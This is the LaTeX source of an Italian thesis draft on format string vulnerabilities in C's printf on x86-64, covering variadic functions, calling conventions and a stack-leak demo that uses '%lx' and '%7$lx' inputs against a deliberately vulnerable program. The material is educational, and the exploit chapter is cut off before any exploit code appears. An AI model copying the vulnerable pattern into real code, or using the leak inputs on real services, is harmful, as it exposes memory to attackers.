\documentclass{theme/uniprthesis}

%%%%%%%%%%% Extra Packages %%%%%%%%%%%
\usepackage[italian]{babel}		% To have Italian names in Sections, Figures, Chapters etc.
\usepackage[T1]{fontenc}

\usepackage{todonotes}			% To ease the revision

\usepackage{booktabs}			% For high-quality tables
\usepackage{tikz}				% For diagrams
\usetikzlibrary{positioning, arrows.meta}
\usepackage{upquote}			% For straight quotes in code snippets


\usepackage{blindtext} 			% Dummy Text - remove
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


%%%%% THESIS / TITLE PAGE INFORMATION
\title{Vulnerabilità format string: teoria, sfruttamento e mitigazioni}
\author{Lexiang Ye}
\advisor{Prof. Roberto Alfieri}
\college{Dipartimento di Scienze Matematiche, Fisiche e Informatiche}
\degree{Corso di Laurea Triennale in Informatica}
\degreeyears{2025--2026}


\begin{document}

\maketitle

%%%% La dedica
\newpage
\thispagestyle{empty}
\null\vspace{\stretch{1}}
\begin{flushright}
	\textit{Dedica}
\end{flushright}
\vspace{\stretch{3}}\null
\newpage

%%%% Gli indici
\pagestyle{plain}
\pagenumbering{roman}
\tableofcontents
%
%
%
%%%% La prefazione
\chapter*{Introduzione} %Se si cambia il Titolo cambiare anche la riga successiva così che appia corretto nell'indice
\addcontentsline{toc}{chapter}{Introduzione} %Per far apparire Introduzione nell'indice (Il nome deve rispecchiare quello del chapter)
\pagenumbering{arabic} % Settaggio numerazione normale

Le vulnerabilità del software sono tra le principali cause di violazione della sicurezza informatica. Tra queste, la vulnerabilità \emph{format string} è nota da decenni eppure continua a comparire in codice reale: nasce da un errore tecnicamente semplice --- lasciare che l'utente controlli la stringa di formato passata a una funzione come \texttt{printf} --- ma le sue conseguenze possono arrivare fino a leggere informazioni sensibili e scrivere in modo arbitrario nella memoria del programma.

È durante CyberChallenge.IT --- il programma nazionale di addestramento in sicurezza informatica a cui ho preso parte --- che ho incontrato per la prima volta i fondamenti della sicurezza del software, un ambito centrale poiché una parte significativa degli attacchi informatici sfrutta proprio difetti di progettazione e vulnerabilità del codice. Delle vulnerabilità presentate, quella che ho trovato più preoccupante per la gravità delle sue possibili conseguenze è stata la format string.

Da questo interesse nasce il lavoro di tesi, che studia la vulnerabilità format string sull'architettura x86-64, attraverso la \texttt{printf} del linguaggio C, la funzione che meglio la rappresenta. Il contributo della tesi è duplice: da un lato spiega il meccanismo tecnico alla base e lo dimostra concretamente, sviluppando e sfruttando un programma vulnerabile scritto appositamente per lo studio, in un ambiente controllato e riproducibile; dall'altro valuta le difese dedicate alla format string, mettendone alla prova l'efficacia proprio sull'\emph{exploit} appena sviluppato.

Ne emerge che nessuna delle protezioni attive di default sul binario è sufficiente a impedirlo, e che perfino quelle create apposta per la format string ne bloccano solo una parte. L'unica difesa realmente efficace resta quindi alla radice: un uso corretto del linguaggio e delle sue funzioni, già in fase di scrittura del codice.

Il percorso che porta a questi risultati si sviluppa nei capitoli seguenti. Il Capitolo~\ref{chapter:background} introduce le nozioni tecniche necessarie a comprendere la vulnerabilità --- le funzioni variadiche del linguaggio C, il funzionamento della \texttt{printf} e la convenzione con cui i suoi argomenti vengono passati a basso livello sull'architettura x86-64 --- e fissa l'ambiente e gli strumenti usati nel resto del lavoro. Il Capitolo~\ref{chapter:fmt_vuln} presenta la vulnerabilità format string vera e propria, contrapponendo un uso corretto e uno vulnerabile della \texttt{printf} e mostrando, su due piccoli programmi di esempio, come da essa si possa sia leggere sia scrivere in memoria. Il Capitolo~\ref{chapter:exploit} combina queste tecniche in un caso pratico completo: dal punto di vista di un attaccante che dispone del solo binario compilato, senza codice sorgente, viene sviluppato un exploit che arriva fino all'ottenimento di una shell interattiva. Il Capitolo~\ref{chapter:mitigations} chiude la parte tecnica valutando le protezioni pensate specificamente per la format string, su due livelli complementari: uno a runtime, verificato sullo stesso exploit del Capitolo~\ref{chapter:exploit}, e uno in fase di compilazione, che permette di individuare la vulnerabilità alla radice.

Data la natura pratica delle tecniche discusse, va infine precisato che i contenuti presentati in questa tesi hanno esclusivamente finalità didattiche e di ricerca in ambito di sicurezza informatica: nessuna delle tecniche descritte è da intendersi come incentivo al loro utilizzo per scopi illeciti.

%
%%%% I Capitoli di Contenuto	
\pagestyle{fancy}
\chapter{Background tecnico}\label{chapter:background}
In questo capitolo vengono affrontate le conoscenze tecniche che supportano la comprensione della vulnerabilità \emph{format string} e vengono introdotti l'ambiente e gli strumenti utilizzati nel lavoro.


\section{Funzioni variadiche in C e specificatori di formato di printf}\label{sec:funcvar_format}
\begin{defn}[Funzione variadica]\label{def:funzione-variadica}
Nel linguaggio C, una \textbf{funzione variadica} è una funzione progettata per accettare un numero variabile di argomenti, potenzialmente di tipi diversi \cite{kr1988}.
\end{defn}

Una delle funzioni variadiche più note è \texttt{printf}, dichiarata nell'\emph{header} \texttt{<stdio.h>} della libreria standard del linguaggio C \cite{man3printf}, come mostrato nel Codice~\ref{lst:printf_decl}.
\begin{lstlisting}[
    language=C,
    numbers=none,
    gobble=4,
    caption={Dichiarazione di \texttt{printf}},
    label={lst:printf_decl}
]
    int printf(const char *fmt, ...);
\end{lstlisting}
L'ellissi \texttt{...} indica che il numero e il tipo di questi argomenti possono variare e che quindi si tratta di una funzione variadica. Questa ellissi può comparire solo alla fine di un elenco di argomenti.
Per le funzioni variadiche, il numero e il tipo degli argomenti che seguono l'ultimo parametro dichiarato non sono determinabili dalla sola dichiarazione della funzione. È quindi compito del programmatore definire una convenzione che il chiamante rispetti, per comunicare in qualche altro modo quanti argomenti sono stati passati. È possibile:
\begin{itemize}
    \item utilizzare una \emph{format string} che indichi il numero e il tipo dei parametri (ad es. la \emph{format string} di \texttt{printf});
    \item passare il numero come argomento fisso;
    \item terminare la lista degli argomenti aggiuntivi con un valore speciale (sentinella).
\end{itemize}
L'altro aspetto rilevante delle funzioni variadiche è che gli argomenti
catturati dall'ellissi non corrispondono ad alcun parametro nominato:
non è quindi possibile accedervi per nome, come si farebbe con un
parametro ordinario, ma serve un meccanismo diverso \cite{kr1988}.

Per inquadrare il funzionamento della \emph{format string} e il modo in cui le funzioni variadiche scorrono la lista degli argomenti aggiuntivi, guardiamo \texttt{minprintf} (Codice~\ref{lst:minprintf}), una versione molto semplificata di \texttt{printf} \cite{kr1988}.
\begin{lstlisting}[
    language=C,
    gobble=4,
    caption={Implementazione semplificata di \texttt{printf} (\texttt{minprintf})},
    label={lst:minprintf}
]
    void minprintf(char *fmt, ...)
    {
        va_list ap;
        va_start(ap, fmt);

        for (char *p = fmt; *p; p++) {
            if (*p != '%') {
                putchar(*p);
                continue;
            }
            switch (*++p) {
            case 'x':
                printf("%x", va_arg(ap, int));
                break;
            case 's':
                printf("%s", va_arg(ap, char *));
                break;
            // ...
            }
        }

        va_end(ap);
    }
\end{lstlisting}
Per gestire gli argomenti aggiuntivi, il linguaggio C ci fornisce l'header standard \texttt{<stdarg.h>}, contenente un insieme di definizioni di macro che stabiliscono come avanzare all'interno di una lista di argomenti. 
Il tipo \texttt{va\_list} viene utilizzato per dichiarare una variabile che farà riferimento, uno dopo l'altro, a ciascuno degli argomenti aggiuntivi anonimi; in \texttt{minprintf}, questa variabile è chiamata \texttt{ap}, che sta per ``argument pointer''. La macro \texttt{va\_start} inizializza \texttt{ap} facendolo puntare al primo argomento senza nome. Questa macro deve essere invocata una volta prima di poter utilizzare \texttt{ap}. È necessaria la presenza di almeno un argomento con nome; l'ultimo di questi argomenti viene utilizzato da \texttt{va\_start} come punto di partenza.

Ogni chiamata a \texttt{va\_arg} restituisce un argomento e fa avanzare \texttt{ap} a quello successivo; \texttt{va\_arg} utilizza il nome del tipo per determinare quale tipo di dato restituire e l'entità del passo da compiere per avanzare. Infine, \texttt{va\_end} si occupa di eseguire le eventuali operazioni di pulizia necessarie. Deve essere chiamata prima che la funzione termini \cite{kr1988}.

\begin{defn}[Specificatore di formato]\label{def:specificatore}
    Uno \textbf{specificatore di formato} è una sottosequenza della \emph{format string}, introdotta dal carattere \%, che stabilisce se e come un argomento aggiuntivo debba essere interpretato e restituito nell'output prodotto \cite{cplusplusprintf}.
\end{defn}

La funzione \texttt{minprintf} stampa sullo standard output (\texttt{stdout}) la stringa indicata da \texttt{fmt}. Qualora quest'ultima contenga degli specificatori di formato, gli argomenti successivi vengono opportunamente formattati e sostituiti al loro posto prima della stampa \cite{cplusplusprintf}. Tale meccanismo ricalca il tipico comportamento delle \emph{format string}.

Il principio di \texttt{printf} della libreria standard è identico; l'aspetto che cambia principalmente è la ricchezza dello specificatore di formato, che infatti ha la seguente struttura (Codice~\ref{lst:format_specifier_syntax}) \cite{man3printf,cplusplusprintf}:
\begin{lstlisting}[
    language={},
    numbers=none,
    gobble=4,
    caption={Struttura generale di uno specificatore di formato della famiglia \texttt{printf} (con l'estensione posizionale POSIX)},
    label={lst:format_specifier_syntax}
]
    %[n$][flag][larghezza][.precisione][lunghezza]specificatore
\end{lstlisting}
Per il nostro scopo sono rilevanti:
\begin{itemize}
    \item \emph{posizione} (\texttt{n\$}), permette di indicare esplicitamente quale argomento della lista debba essere formattato, anziché consumare implicitamente il successivo non ancora utilizzato (ad es. \texttt{\%3\$x} formatta come esadecimale il terzo argomento dopo \texttt{fmt}). Non fa parte dello standard ISO C, ma è un'estensione POSIX \cite{man3printf}; la sua disponibilità dipende quindi dalla libreria C effettivamente linkata, non dal linguaggio in sé.
    \item \emph{larghezza}, il numero minimo di caratteri da stampare. Se il valore da stampare è più corto di questo numero, il risultato viene riempito con spazi vuoti. Il valore non viene troncato, nemmeno se risulta più lungo.
    \item \emph{lunghezza}, modifica la dimensione del tipo di dato. Noi useremo:
        \begin{itemize}
            \item \texttt{hh} che per definizione è esattamente 1 byte di dimensione
            \item \texttt{h} che è praticamente sempre 2 byte di dimensione
        \end{itemize}

    \item \emph{specificatore}, definisce il tipo e l'interpretazione del relativo argomento. Ci interessano:
        \begin{itemize}
            \item \texttt{x}, stampa l'argomento intero esadecimale senza segno
            \item \texttt{p}, stampa l'argomento come indirizzo di memoria (puntatore)
            \item \texttt{n}, non viene stampato nulla, però il numero di caratteri scritti fino a quel momento viene memorizzato nella locazione di memoria puntata dall'argomento corrispondente
        \end{itemize}
\end{itemize}


\section{La calling convention x86\_64 e il confronto con x86}\label{sec:callconv}
La vulnerabilità \emph{format string}, la vediamo in particolare per l'architettura x86\_64, nota anche come AMD64. Ci interessano le convenzioni utilizzate da tale architettura durante la chiamata di funzione, in particolare dove vengono memorizzati gli argomenti passati alla funzione (ci servirà quando andremo a sfruttare la vulnerabilità).
Facciamo poi anche un rapido confronto con l'architettura x86 per mostrare l'impatto che il cambiamento di architettura può avere sulla tecnica di sfruttamento.

\subsection{System V AMD64 ABI: registri per il passaggio dei parametri}\label{subsec:x86_64}
\begin{defn}[ABI]\label{def:abi}
Un'\textbf{ABI} (\emph{Application Binary Interface}) definisce in che modo i diversi componenti di un codice binario possano interfacciarsi su un determinato sistema operativo e una determinata architettura \cite{silberschatz2019}.
\end{defn}

Tra i molti dettagli di basso livello specificati da un'ABI, quello che riguarda più da vicino la vulnerabilità trattata in questa tesi è la \emph{calling convention}, ovvero l'insieme di regole con cui il chiamante dispone gli argomenti di una funzione affinché il chiamato possa recuperarli correttamente. Per la piattaforma di riferimento (Linux, x86\_64), queste regole sono specificate dalla System V AMD64 ABI, che decide la collocazione di ciascun argomento --- in un registro o sullo stack --- sulla base di una classificazione.

Gli argomenti delle funzioni vengono suddivisi in diverse categorie, mappate sulle specifiche famiglie di registri dell'architettura AMD64. Quelli rilevanti ai fini della trattazione della nostra vulnerabilità appartengono alla classe \emph{INTEGER}, costituita dai tipi interi che possono essere contenuti all'interno di uno dei registri di uso generale (\emph{general purpose registers}).

I tipi base (con segno e senza segno) appartenenti alla classe \emph{INTEGER} sono: \texttt{\_Bool}, \texttt{char}, \texttt{short}, \texttt{int}, \texttt{long}, \texttt{long long} e puntatori.
La dimensione di ciascun argomento viene arrotondata per eccesso a otto byte. Di conseguenza, lo stack risulta sempre allineato a otto byte \cite{psabi2025}.

Per gli argomenti di classe \emph{INTEGER}, il passaggio avviene assegnandoli da sinistra verso destra al primo registro disponibile nella sequenza: \texttt{\%rdi}, \texttt{\%rsi}, \texttt{\%rdx}, \texttt{\%rcx}, \texttt{\%r8}, \texttt{\%r9} (Tabella~\ref{tab:registri_integer}).
Completata questa assegnazione ai registri, gli argomenti rimanenti (destinati alla memoria) vengono inseriti nello stack in ordine inverso, ovvero da destra verso sinistra \cite{psabi2025}.

\begin{table}[ht]
    \centering
    \caption{Registro assegnato a ciascuna posizione per gli argomenti di classe \emph{INTEGER}}
    \label{tab:registri_integer}
    \begin{tabular}{cc}
        \toprule
        Posizione argomento & Registro \\
        \midrule
        1 & \texttt{\%rdi} \\
        2 & \texttt{\%rsi} \\
        3 & \texttt{\%rdx} \\
        4 & \texttt{\%rcx} \\
        5 & \texttt{\%r8}  \\
        6 & \texttt{\%r9}  \\
        \midrule
        $\geq 7$ & stack \\
        \bottomrule
    \end{tabular}
\end{table}

\subsection{Il caso delle funzioni variadiche}\label{subsec:funvar_cc}
Le funzioni standard, a parametri fissi, applicano la \emph{calling convention} x86\_64 senza difficoltà, poiché conoscono in anticipo numero e tipo degli argomenti che vengono loro passati, e sanno dunque già dove reperirli.

Le funzioni variadiche, invece, non sanno in anticipo quanti argomenti riceveranno, né se si troveranno nei registri o sullo stack.
Come visto in \ref{sec:funcvar_format}, le funzioni variadiche gestiscono gli argomenti aggiuntivi tramite l'\emph{header} \texttt{<stdarg.h>}, come se fossero una lista. Però non abbiamo specificato l'implementazione di questa lista, che varia da architettura a architettura poiché ci sono convenzioni differenti da rispettare. Vediamo dunque come \texttt{<stdarg.h>} sia implementato concretamente sull'architettura x86\_64.

In x86\_64, i primi argomenti interi vengono passati nei sei registri nella Tabella~\ref{tab:registri_integer}. Il problema è che \texttt{<stdarg.h>} usa dei puntatori strutturati per accedere agli argomenti e non possiamo accedere tramite puntatori a dei registri come invece facciamo per gli argomenti nello stack.
La soluzione è stata quella di mettere nel prologo delle funzioni variadiche del codice che vada a salvare il contenuto dei registri usati per il passaggio degli argomenti in un'area di memoria \ref{def:reg_save_area}.

\begin{defn}[Register Save Area]\label{def:reg_save_area}
    La \textbf{Register Save Area} è un'area di memoria a dimensione fissa (176 byte), allocata nello \emph{stack frame} di una funzione variadica che invoca \texttt{va\_start}.
    Ogni registro usato per il passaggio dei parametri vi occupa un offset fisso (Figura~\ref{tab:register_save_area}), così che \texttt{va\_arg} possa accedere agli argomenti arrivati nei registri con la stessa aritmetica dei puntatori usata per quelli sullo stack.
\end{defn}

\begin{table}[ht]
    \centering
    \caption{Offset dei registri argomento nella \emph{register save area}}
    \label{tab:register_save_area}
    \begin{tabular}{cc}
        \toprule
        Registro & Offset (byte) \\
        \midrule
        \texttt{\%rdi} & 0 \\
        \texttt{\%rsi} & 8 \\
        \texttt{\%rdx} & 16 \\
        \texttt{\%rcx} & 24 \\
        \texttt{\%r8}  & 32 \\
        \texttt{\%r9}  & 40 \\
        \midrule
        \texttt{\%xmm0--\%xmm7} & 48--175 \\
        \bottomrule
    \end{tabular}
\end{table}

Devono essere salvati solo i registri che potrebbero essere utilizzati per passare gli argomenti. 
Una funzione variadica chiamata non sa quanti registri verranno popolati \todo{nota a piè pagina per i registri vettoriali e \%al che fa limite superiore}, di conseguenza, per non perdere potenziali dati validi, il prologo è obbligato a salvare sempre tutti e 6 i registri interi destinati al passaggio dei parametri all'interno della register save area sullo stack.

Il tipo \texttt{va\_list} (Codice~\ref{lst:va_list}) è un array di un solo elemento di tipo \texttt{struct}, contenente le informazioni necessarie per permettere alla macro \texttt{va\_arg} di estrarre l'argomento successivo correttamente. È compito della macro \texttt{va\_start} di inizializzare questa \texttt{struct}.

\begin{lstlisting}[
    language=C,
    numbers=none,
    gobble=4,
    caption={\texttt{va\_list} type declaration},
    label={lst:va_list}
]
    typedef struct {
        unsigned int gp_offset;
        unsigned int fp_offset;
        void *overflow_arg_area;
        void *reg_save_area;
    } va_list[1];
\end{lstlisting}

Vediamo le componenti di \texttt{va\_list}:
\begin{itemize}
    \item \texttt{reg\_save\_area}: puntatore all'inizio della \emph{register save area}.

    \item \texttt{gp\_offset}: contiene l'offset in byte, a partire da \texttt{reg\_save\_area}, del punto in cui è salvato il successivo registro \emph{general-purpose} disponibile. Nel caso in cui tutti i registri di argomento siano esauriti, viene impostato al valore 48 ($6 \times 8$).

    \item \texttt{fp\_offset}: contiene l'offset in byte, a partire da \texttt{reg\_save\_area}, del punto in cui è salvato il successivo registro \emph{floating-point} disponibile. Nel caso in cui tutti i registri di argomento siano esauriti, viene impostato al valore 176 ($6 \times 8 + 8 \times 16$).

    \item \texttt{overflow\_arg\_area}: puntatore nello stack "vero", fuori dalla register save area: punta al primo argomento passato lì (se esiste) e avanza a ogni lettura successiva. È dove \texttt{va\_arg} finisce per leggere una volta che \texttt{gp\_offset} o \texttt{fp\_offset} hanno raggiunto il loro valore massimo.
\end{itemize}

Come detto più volte, la macro \texttt{va\_arg} ci permette di estrarre gli argomenti aggiuntivi di una funzione variadica correttamente.
A ogni chiamata di \texttt{va\_arg(ap, type)} (ap è di tipo \texttt{va\_list}) controlla se \texttt{type} è idoneo a essere passato tramite registri. In caso
\begin{itemize}
    \item \emph{positivo}, viene calcolato quanti registri sono necessari per contenere \texttt{type} e se i registri
    \begin{itemize}
        \item \emph{sono disponibili}, l'argomento viene estratto dai relativi registri in base agli offset correnti.
        \item \emph{non sono disponibili}, l'argomento viene estratto dallo stack, in base agli offset correnti
    \end{itemize}

    \item \emph{negativo}, l'argomento viene estratto dallo stack, in base agli offset correnti.
\end{itemize}
Alla fine di ogni chiamata, vengono aggiornati i relativi offset in \texttt{va\_list} in base ai registri utilizzati o allo spazio consumato nello stack.

Vediamo ora come questi meccanismi si applichino al caso specifico \texttt{printf}.
La funzione variadica \texttt{printf} possiede la \emph{format string} come unico parametro fisso. Tale argomento occuperà quindi il primo registro \emph{general-purpose} disponibile, ovvero \texttt{\%rdi}. Gli eventuali argomenti aggiuntivi, occuperanno i successivi registri o lo stack, in base al loro tipo e numero.
Se al chiamante passata esclusivamente la \emph{format string} senza ulteriori argomenti, il prologo della funzione provvederà comunque a salvare il contenuto (potenzialmente indefinito) dei restanti cinque registri \emph{general-purpose} all'interno della \emph{register save area}.
Qualora la \emph{format string} contenesse degli specificatori (ad es. \texttt{\%x} o \texttt{\%p}), la libreria richiamerebbe iterativamente \texttt{va\_arg}, andando a leggere il contenuto di quei registri che, di fatto, non corrispondono ad alcun argomento reale. Per questo motivo, ai fini di questa trattazione, possiamo riferirci a questi valori con il termine informale di ``argomenti fantasma'' (ovvero dati residui di precedenti operazioni trattati erroneamente come parametri validi).
Se, inoltre, la stringa contenesse un numero di specificatori tale da esaurire i registri disponibili, \texttt{va\_arg} proseguirebbe la lettura, andando a prelevare ulteriori ``argomenti fantasma'',direttamente dallo stack.
Vedremo nel Capitolo 2 come questo comportamento permetta a un attaccante di ottenere la lettura e la scrittura di locazioni di memoria arbitrarie, gettando le basi teoriche per lo sfruttamento delle vulnerabilità di tipo \emph{Format String}.

\chapter{La vulnerabilità Format String}\label{chapter:fmt_vuln}
In questo capitolo è presentato in che modo la vulnerabilità \emph{format string} viene introdotta con un utilizzo errato della \texttt{printf} e quali azioni è possibile compiere quando essa è presente.


\section{Uso corretto e uso errato di printf}\label{sec:printf_right_wrong}
La funzione \texttt{printf} può essere utilizzata in diversi modi, alcuni corretti e sicuri, ed altri errati e vulnerabili.
Questo aspetto si basa principalmente su chi ha il controllo della \emph{format string}: il programmatore oppure l'utilizzatore del programma.

\subsection{Il pattern sicuro: format string come costante}\label{subsec:right_fmt}
Un uso corretto prevede che, all'interno della \emph{format string}, ogni specificatore di formato corrisponda a un argomento effettivamente passato alla funzione e che i rispettivi tipi di dato siano tra loro compatibili.
Per rispettare questa regola, la \emph{format string} deve essere scritta staticamente nel codice sorgente dal programmatore, in modo che sia sotto il suo esclusivo controllo (Codice~\ref{lst:right_fmt}).
\begin{lstlisting}[
    language=C,
    gobble=4,
    caption={Esempio di uso sicuro di \texttt{printf}},
    label={lst:right_fmt}
]
    #include <stdio.h>

    int main(void) {
        char buf[64];
        
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
            return 1;
        }
        
        printf("%s", buf);

        return 0;
    }
\end{lstlisting}

Tuttavia, il fatto che sia scritta staticamente non evita che possano esserci \emph{undefined behavior} o un \emph{leak} di informazioni. Il programmatore ha la responsabilità di controllare il numero e il tipo degli specificatori rispetto agli argomenti.

\subsection{Il pattern vulnerabile: format string controllata dall'utente}\label{subsec:wrong_fmt}
Un uso errato e vulnerabile consiste nell'avere la \emph{format string} sotto il completo controllo dell'utente (Codice~\ref{lst:wrong_fmt}).
Di conseguenza, un attaccante può rompere facilmente la regola secondo cui ogni specificatore deve corrispondere ad un argomento effettivamente passato alla \texttt{printf}.
\begin{lstlisting}[
    language=C,
    gobble=4,
    caption={Esempio di uso vulnerabile di \texttt{printf}},
    label={lst:wrong_fmt}
]
    #include <stdio.h>

    int main(void) {
        char buf[64];

        if (fgets(buf, sizeof(buf), stdin) == NULL) {
            return 1;
        }

        printf(buf);

        return 0;
    }
\end{lstlisting}
Come detto nella Sezione~\ref{sec:callconv}, se uno specificatore non corrisponde a nessun argomento passato alla \texttt{printf}, esso va ad agire su dati residui presenti sui registri o sullo stack, in base ai valori correnti degli offset di \texttt{va\_list}.
Questo permette all'attaccante di causare \emph{leak} di informazioni o addirittura di eseguire scritture in memoria.


\section{Information disclosure: individuare e leggere un valore con \%x}\label{sec:info_disclosure}
Prendiamo il codice vulnerabile appena mostrato e aggiungiamo una variabile locale \texttt{local\_secret} che viene allocata nello \emph{stack frame} della funzione \texttt{main} (Codice~\ref{lst:leak_demo_c}).
Mostriamo, tramite lo sfruttamento della vulnerabilità \emph{format string}, come è possibile vederne il contenuto senza che questo venga passato esplicitamente a \texttt{printf} --- operazione altrimenti non fattibile.
\begin{lstlisting}[
    language=C,
    gobble=4,
    caption={Esempio di programma vulnerabile con variabile locale \texttt{local\_secret}},
    label={lst:leak_demo_c}
]
    #include <stdio.h>

    int main(void) {
        long local_secret = 0x1337;

        char buf[64];

        if (fgets(buf, sizeof(buf), stdin) == NULL) {
            return 1;
        }

        printf(buf);

        return 0;
    }
\end{lstlisting}

Per sapere dove la variabile \texttt{local\_secret} viene collocata esattamente, è necessario analizzare il disassemblato (Codice~\ref{lst:disas_leak_demo}), ovvero il codice assembly ricavato dalla traduzione del codice macchina dell'eseguibile, prodotto dalla compilazione di Codice~\ref{lst:leak_demo_c}. Da questo è possibile capire lo spazio che il \texttt{main} riserva alle sue variabili locali, dove esattamente le posiziona e anche la struttura del suo \emph{stack frame}.
\begin{lstlisting}[
    language={},
    numbers=none,
    gobble=4,
    caption={Estratto del disassemblato di \texttt{main}: posizione di \texttt{local\_secret}},
    label={lst:disas_leak_demo}
]

    ; ...

    push   rbp
    mov    rbp, rsp
    sub    rsp, 0x60
    
    ; ...
    
    mov    QWORD PTR [rbp-0x58], 0x1337
    
    ; ...
    
    call   printf@plt
    
    ; ...
\end{lstlisting}
Lo spazio per le variabili locali viene allocato da ``\texttt{sub rsp, 0x60}'', ovvero 96 byte.
Il registro \texttt{rsp} (\emph{stack pointer}) subito prima della \texttt{sub} ha lo stesso valore del registro \texttt{rbp} (\emph{base pointer}). Di conseguenza ``\texttt{mov QWORD PTR [rbp-0x58], 0x1337}'' indica che \texttt{local\_secret} si trova nel secondo \emph{qword} (blocco da 8 byte) a partire dalla cima dello stack (\texttt{rsp}), poiché il primo \emph{qword} si troverebbe a \texttt{rbp-0x60}.

Lo stack pointer non viene più modificato prima della chiamata a \texttt{printf} che quindi si ritrova con lo stack nello stato illustrato in Figura~\ref{fig:stack_leak_demo}.

\begin{figure}[ht]
    \centering
    \begin{tikzpicture}[
        box/.style={
            draw, thick,
            minimum width=4.8cm,
            minimum height=1cm,
            anchor=south west,
            font=\ttfamily\small
        },
        emptybox/.style={
            draw, thick,
            minimum width=4.8cm,
            minimum height=1cm,
            anchor=south west
        },
        ptr/.style={-{Stealth[length=3mm]}, thick},
        addr/.style={font=\ttfamily\footnotesize, anchor=west, inner sep=3pt}
    ]

    % Blocchi: base (indirizzi alti) in basso, cima (indirizzi bassi) in alto
    \node[box] (ret)    at (0,0) {saved ret addr};
    \node[box] (srbp)   at (0,1) {saved rbp};
    \node[emptybox, minimum height=2cm] (gapmid) at (0,2) {};
    \node at (2.4,3) {\color{gray}$\vdots$};
    \node[box] (secret) at (0,4) {local\_secret = 0x1337};
    \node[emptybox] (topgap) at (0,5) {};

    % Puntatori a sinistra: freccia allo spigolo alto-sinistra del blocco
    \node[font=\ttfamily\small, anchor=east] (rsplabel) at (-1.9,6) {rsp};
    \draw[ptr] (rsplabel.east) -- (0,6);
    \node[font=\ttfamily\small, anchor=east] (rbplabel) at (-1.9,2) {rbp};
    \draw[ptr] (rbplabel.east) -- (0,2);

    % Indirizzi a destra: allo spigolo alto-destra del blocco
    \node[addr] at (4.8,6) {rbp-0x60};
    \node[addr] at (4.8,5) {rbp-0x58};

    % Etichette indirizzi alti/bassi + freccia verticale
    \node[font=\small] (low)  at (8.1,6.3) {indirizzi più bassi};
    \node[font=\small] (high) at (8.1,-0.3) {indirizzi più alti};
    \draw[ptr] (low) -- (high);

    \end{tikzpicture}
    \caption{Stato dello \emph{stack frame} di \texttt{main} al momento della chiamata a \texttt{printf}, con la posizione di \texttt{local\_secret}}
    \label{fig:stack_leak_demo}
    
\end{figure}

La \emph{format string} occupa da sola il primo registro disponibile, \texttt{\%rdi}; restano quindi cinque registri \emph{general-purpose} (\texttt{\%rsi}, \texttt{\%rdx}, \texttt{\%rcx}, \texttt{\%r8}, \texttt{\%r9}) che la \emph{format string} non ha richiesto esplicitamente, ma che \texttt{va\_arg} considera comunque disponibili: sono gli ``argomenti fantasma'' introdotti nella Sezione~\ref{sec:callconv}. I primi cinque specificatori di formato leggono dunque, uno per uno, il contenuto residuo di questi cinque registri.

Esauriti i registri, il sesto specificatore legge il primo argomento dallo stack, puntato da \texttt{overflow\_arg\_area} a partire dall'\texttt{rsp} di \texttt{main} al momento della chiamata --- lo stesso \texttt{rsp} da cui abbiamo appena misurato la posizione di \texttt{local\_secret}. Il settimo specificatore legge quindi il secondo \emph{qword} a partire da \texttt{rsp}, che è esattamente dove si trova \texttt{local\_secret}.

Abbiamo due modi per arrivare a \texttt{local\_secret} (Codice~\ref{lst:leak_interaction}):
\begin{itemize}
    \item tramite una sequenza di specificatori di formato \texttt{\%lx};
    \item tramite lo specificatore di formato \texttt{\%7\$lx}.
\end{itemize}
\begin{lstlisting}[
    language={},
    numbers=none,
    gobble=4,
    caption={Invio della \emph{format string} per il \emph{leak} di \texttt{local\_secret}},
    label={lst:leak_interaction}
]
    %lx %lx %lx %lx %lx %lx %lx
    55790cd9e2a1 fbad2288 55790cd9e2bc 0 55790cd9e2a0 0 1337

    %7$lx
    1337
\end{lstlisting}

La sequenza di specificatori \texttt{\%lx} consuma, uno per uno, gli slot disponibili --- i cinque registri, poi lo stack --- fino a raggiungere \texttt{local\_secret} al settimo, stampato come \texttt{1337}.

Lo specificatore \texttt{\%7\$lx}, usato da solo, referenzia direttamente la settima posizione senza che le prime sei compaiano esplicitamente nella \emph{format string}: è esattamente il caso dei ``buchi'' descritto nella Sezione~\ref{sec:funcvar_format}, che la specifica richiede di evitare \cite{man3printf}. Il meccanismo che risolve la posizione richiesta si comporta però come se, per ciascuna delle sei posizioni non referenziate, fosse stato comunque letto un valore con \texttt{\%lx}. Non è un caso che i due metodi diano lo stesso risultato: entrambi consumano, nello stesso ordine, la stessa sequenza di slot \emph{general-purpose} (i cinque registri, poi lo stack) prima di raggiungere il settimo.\footnote{Se una delle posizioni saltate corrispondesse invece a un valore \emph{floating-point}, questa equivalenza implicita non varrebbe più: il conteggio dei registri \emph{general-purpose} avanzerebbe comunque, ma quello dei registri vettoriali no, disallineando i due contatori (verificato empiricamente).}

Il principio appena dimostrato non dipende dallo specifico specificatore \texttt{\%lx}: qualunque conversione che non dereferenzi l'argomento (come \texttt{\%x} e \texttt{\%p}), leggerebbe lo stesso registro o la stessa posizione di stack, cambiando solo il modo in cui il valore viene stampato. Lo stesso disallineamento tra specificatori dichiarati e argomenti realmente forniti che abbiamo sfruttato per leggere permette, come vedremo nella prossima sezione, anche di scrivere in memoria.


\section{Scrittura in memoria con \%n: il problema della dimensione}


\section{Scritture parziali: \%hhn e \%hn per la scrittura byte-a-byte}

\chapter{Sviluppo pratico di un exploit}\label{chapter:exploit}
Finora abbiamo sempre avuto il codice sorgente a disposizione. Nel mondo reale però, molti servizi con cui è possibile interagire non mettono a disposizione né il codice sorgente né il file binario compilato. L'attaccante si trova quindi in uno scenario di tipo \emph{black-box}: non sa come sia scritto il programma, può solo fornirgli input e studiarne l'output o il comportamento.

Se però l'attaccante entra in possesso anche solo del binario, è possibile, tramite gli strumenti elencati nella Sottosezione~\ref{subsec:tools}, ottenere informazioni rilevanti tra cui: architettura, formato del file, impostazioni di sicurezza, disassemblato e decompilato (pseudocodice simile al linguaggio originale).

Tali informazioni rendono possibile ricostruire la logica del programma e individuarne le vulnerabilità: è esattamente ciò che tratta questo capitolo, insieme alla scrittura dello script Python che le sfrutta, applicando le tecniche del Capitolo~\ref{chapter:fmt_vuln}.


\section{Analisi del binario vulnerabile}\label{sec:vuln_service}
È necessario ottenere informazioni sul binario, di cui non sappiamo praticamente niente.
Il comando \texttt{file} permette di ricavare il formato del binario e la sua architettura (Codice~\ref{lst:file_output}) che sono rispettivamente ELF e x86\_64 poiché il binario è stato compilato con GCC nell'ambiente di riferimento in Tabella~\ref{tab:ambiente_riferimento}.
